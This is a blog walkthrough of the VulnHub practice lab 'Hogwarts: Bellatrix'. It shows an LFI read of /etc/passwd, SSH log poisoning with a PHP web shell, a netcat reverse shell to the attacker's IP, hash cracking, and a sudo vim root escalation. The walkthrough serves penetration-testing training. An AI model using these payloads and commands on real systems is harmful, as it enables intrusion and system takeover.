<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hogwarts: Bellatrix Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hogwarts-bellatrix-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-12-18T13:08:14+00:00">December 18, 2020</time><time class="updated" datetime="2025-07-09T11:38:20+00:00">July 9, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we‚Äôre going to solve another boot2root challenge called ‚ÄúHOGWARTS: BELLATRIX ‚Äú. It‚Äôs available at VulnHub for penetration testing practice. This lab is not difficult if we have the right basic knowledge to break the labs and are attentive to all the details we find during the reconnaissance. The credit for making this lab goes to BertrandLorente9. Let‚Äôs get started and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;">You can download it from here: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/hogwarts-bellatrix,609/">https://www.vulnhub.com/entry/hogwarts-bellatrix,609/</a></strong></span></span></p>
<p><span style="color: #000000;">Level: Easy-Medium</span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<p><strong><span style="color: #000000;">Network Scan</span></strong></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><strong><span style="color: #000000;">Enumeration</span></strong></p>
<ul>
<li><span style="color: #000000;">Page Source Code</span></li>
</ul>
<p><strong><span style="color: #000000;">Exploiting</span></strong></p>
<ul>
<li><span style="color: #000000;">RCE with LFI and SSH Log Poisoning</span></li>
</ul>
<p><strong><span style="color: #000000;">Privilege Escalation</span></strong></p>
<ul>
<li><span style="color: #000000;">Abusing Sudo Rights</span></li>
<li><span style="color: #000000;">Capture the flag</span></li>
</ul>
<h3><span style="color: #800000;">Network Scan</span></h3>
<p><span style="color: #000000;">I do always üòä try to identify Machine IP using our favourite tool named ‚Äú<strong>netdiscover</strong>‚Äù. Here you can observe the machine we have obtained ‚Äú192.168.1.31‚Äù.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xrGKt8j00m4/X9yl1Qh3JTI/AAAAAAAAr8Y/63i4clS5sp8nKS4v7HwOqaYS9iqE0rsCACLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Further, I performed a port scan with the help of the following command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV -p- 192.168.1.31</pre>
<p><span style="color: #000000;">Hmmmm!! So, it has shown only two open ports for SSH (22) &amp; HTTP (80)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LmvaY5H4nOg/X9yl6nHJ5FI/AAAAAAAAr8c/4MEfmUsAki4rrunY-RfOvXiWqkUVgE5PQCLcBGAsYHQ/s16000/2.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">I explored target IP in the web browser and found the highlighted string‚Ä¶‚Ä¶‚Ä¶‚Ä¶</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-50QhqjBG8f4/X9ymAO_EZbI/AAAAAAAAr8g/2tI_91ZI87sZiEFPCiVPhzwLiLT0VZEcgCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">I also take a look at the page source code and read ## comment, thus I concluded that the above-highlighted string was a hint for the web directory. Also here PHP included function is used to call some files.</span></p>
<p><span style="color: #000000;">Hmmmm! Maybe through these hints, the author wants us to identify LFI vulnerability in this machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yjX6RsUnz08/X9ymGUITc2I/AAAAAAAAr8o/ZUNI_64lASowdwaELXwrZUxu4TGUXcvHwCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">So, without wasting time I try to extract /etc/passwd file by executing the following:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.31/ikilledsiriusblack.php?file=/etc/passwd</pre>
<p><span style="color: #000000;">Yeah, It was vulnerable to LFI.¬† Boom!¬†</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-z_WDfM8bl-8/X9ymOK8doAI/AAAAAAAAr8s/BM5gPk96z98zAJTtijbRplQt-3ERNEYSgCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">With my previous experience, I try to check for <a style="color: #000000;" href="https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/">SSH Log Poisoning</a> and looked for auth.log file and it was accessible.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RwSbB68rMgg/X9ymXEcqqWI/AAAAAAAAr84/fp7ESDffaokTIzz5s-3W6LsAgOFwpbCwgCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Since the auth.log file generates a log for every success and failed login attempt when we try to connect with the webserver. Taking advantage of this feature now I will send <strong>malicious PHP</strong> code as a fake user through SSH and it will get added automatically in the auth.log file as a new log.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh '&lt;?php system($_GET['c']); ?&gt;'@192.168.1.31</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9v2A1XLigpQ/X9ymc4LdArI/AAAAAAAAr88/PxevCyejTOUV9umOrpGBTHoBIoO6mMY4ACLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Here it will dump the data of auth.log as well as execute the command given through cmd.</span></p>
<p><span style="color: #000000;">So, I executed ls -al as cmd command to verify directory listing and confirm its result from inside the given screenshot.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cpet3GZig3U/X9ymjhSOnuI/AAAAAAAAr9E/DEHHZS7PlTYSMR6WWPOzhvzmhLIfMberwCLcBGAsYHQ/s16000/8.png"/></span></p>
<h3><span style="color: #800000;">Exploit LFI</span></h3>
<p><span style="color: #000000;">Now, it‚Äôs time to take the reverse shell of the VM. Here I have used Netcat as listener and ncat as one-liner payload to exploit the machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log&amp;c=ncat -e /bin/bash 192.168.1.2 1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IVArg12Kde4/X9ymzI03R3I/AAAAAAAAr9Q/zV8aCk5rtkEYR7Zk2nzDxfLpF3ICCqrzgCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Upon obtaining a reverse shell connection I recon further and found a directory (in based64) that contains two files.</span></p>
<p><span style="color: #000000;"><strong>.secret.dic</strong> was a hidden file that contains wordlist and Swordofgryffindor stores hash for the user ‚Äú<strong>lestrange</strong>‚Äú</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-y6S3_InIwfQ/X9ym6eqH8CI/AAAAAAAAr9U/lWSajLVflGYJVHOqzFu5BtEln8XJ0kFNQCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">So, I download the dictionary in my Kali Linux and copied the hash string in a document file. With the help of John the ripper, I obtained the Password in Plaintext.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hKhD1LwLdu4/X9ynB8h-k0I/AAAAAAAAr9Y/nLZBXt_6wacQJ-bUfZBlfOKUIMddh88DgCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FLNuiKAWdrY/X9ynHQ_IZBI/AAAAAAAAr9c/Wfb8B-qf9wA-NAuNJJL-WKwZQXOCqdqRgCLcBGAsYHQ/s16000/12.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Since the password was ‚Äú<strong>ihateharrypotter</strong>‚Äù for the user <strong>lestrange</strong> thus I switched the account and looked for sudo rights for him.</span></p>
<p><span style="color: #000000;">üòä All Permissions with NOPASSWD to execute /usr/bin/vim</span></p>
<p><span style="color: #000000;">Let‚Äôs exploit it for root privileges, just execute the following command:</span></p>
<p><span style="color: #0000ff;"><strong>https://gtfobins.github.io/gtfobins/vim/#sudo</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo vim -c ':!/bin/sh'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6ZVRrOlIX0A/X9ynRockSnI/AAAAAAAAr9k/hd_GI_M2NAo_BBKDFjrwtedg8IhYeMkpACLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">So, as I have the root shell, Let‚Äôs grab the Flag</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /root
ls
cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hg493i_4Izk/X9ynYjRF7PI/AAAAAAAAr9s/mvJdx0sB1q8jiUgETUwTWe-ldK6ua_hVQCLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">AND WE HIT THE WICKED‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶.</span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span>¬†<strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong>¬†<span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>¬†‚Äì Paras khorwal is a Certified Ethical Hacker, Technical writer and Penetration Tester at Hacking Articles. Technology and Gadget freak. Contact¬†<span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/paras-khorwal-904470197"><strong>Here</strong></a></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
